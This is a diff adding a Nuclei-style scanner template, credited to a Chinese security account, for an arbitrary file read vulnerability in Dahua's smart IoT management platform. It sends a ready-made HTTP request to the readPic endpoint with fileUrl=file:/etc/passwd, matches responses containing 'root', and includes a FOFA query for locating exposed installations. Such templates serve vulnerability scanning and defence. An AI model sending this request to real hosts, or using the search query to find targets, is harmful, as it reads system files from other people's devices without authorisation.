@@ -1,0 +1,27 @@
+id: DaHuaZhiNengWuLian-readpic-FileRead
+
+info:
+  name: 大华智能物联综合管理平台-readpic接口-任意文件读取
+  author: 公众号网络安全透视镜
+  severity: high
+  metadata:
+    fofa-query: body="客户端会小于800"
+  tags: FileRead
+
+variables:
+  
+
+http:
+  - raw:
+      - |
+          GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "root")'
